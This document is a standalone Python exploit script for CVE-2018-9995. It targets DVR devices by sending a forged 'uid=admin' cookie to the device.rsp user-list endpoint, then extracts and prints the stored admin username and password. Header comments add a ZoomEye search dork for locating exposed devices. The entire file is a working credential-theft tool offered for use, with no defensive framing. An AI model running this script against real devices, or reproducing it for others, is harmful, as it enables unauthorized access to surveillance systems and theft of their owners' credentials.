#!/bin/python
#Dork     : /login.rsp
#Search   : https://www.zoomeye.org/
#TimeUpdt : Uploaded At 15 February 2020


import os, requests, re, time
from colorama import Fore, Style

def banner():
    print(f"{Fore.YELLOW}    ,(())), ")
    print(f"{Fore.YELLOW}    '(('''))' ")
    print(f"{Fore.YELLOW}    '(|{Fore.WHITE}*{Fore.RED}_{Fore.WHITE}*{Fore.YELLOW}|)'    {Fore.RED}* {Fore.WHITE}DVRs; Credentials Exposed ")
    print(f"{Fore.YELLOW}      : {Fore.RED}={Fore.YELLOW} :      {Fore.RED}* {Fore.YELLOW}Author {Fore.RED}: {Fore.WHITE}Keyw0rdz ")
    print(f"{Fore.WHITE}      _) (_      {Fore.RED}* {Fore.YELLOW}Exploit {Fore.RED}: {Fore.WHITE}CVE-2018-9995 ")
    print(f"{Fore.WHITE}    /`_ , _`\ ")
    print(f"{Fore.WHITE}   / (_>*<_) \ ")
    print(f"{Fore.WHITE}  / / )   ( \ \ ")
    print(f"{Fore.WHITE}  \ \/  {Fore.RED}.{Fore.WHITE}  \/ /")
    print(f"{Fore.WHITE}   \_)\___/(_/")

    

os.system('clear')

headers = {}
time.sleep(2)
banner()

time.sleep(1.5)
host = input(f"{Fore.RED}host{Fore.WHITE}> ")
time.sleep(1.5)
port = input(f"{Fore.RED}port{Fore.WHITE}> ")

os.system('clear')

forexe = (f"http://{host}:{port}/device.rsp?opt=user&cmd=list")
forchk = (f"http://{host}:{port}/")

def Headers(xCookie):
    headers["Host"]             =  forchk
    headers["User-Agent"]       = "Morzilla/7.0 (911; Pinux x86_128; rv:9743.0)"
    headers["Accept"]           = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
    headers["Accept-Languag"]   = "es-AR,en-US;q=0.7,en;q=0.3"
    headers["Connection"]       = "close"
    headers["Content-Type"]     = "text/html"
    headers["Cookie"]           = "uid="+xCookie
    
    return headers

req = requests.get(forexe, headers=Headers(xCookie="admin"), timeout=10.000).text
user = re.findall(r'"uid":"(.*?)"', req)[0]
pswd = re.findall(r'"pwd":"(.*?)"', req)[0]


time.sleep(2)
banner()
time.sleep(1.5)
print(f"\n       {Fore.WHITE}- {Fore.YELLOW}Result {Fore.WHITE}-   ")
time.sleep(1)
print(f"{Fore.YELLOW} Execution :{Fore.RED} {host}:{port}")
time.sleep(1)
print(f"    {Fore.BLUE}[{Fore.GREEN}!{Fore.BLUE}] {Fore.YELLOW}Username : {Fore.GREEN}{user}")
time.sleep(1)
print(f"    {Fore.BLUE}[{Fore.GREEN}!{Fore.BLUE}] {Fore.YELLOW}Password : {Fore.GREEN}{pswd}")

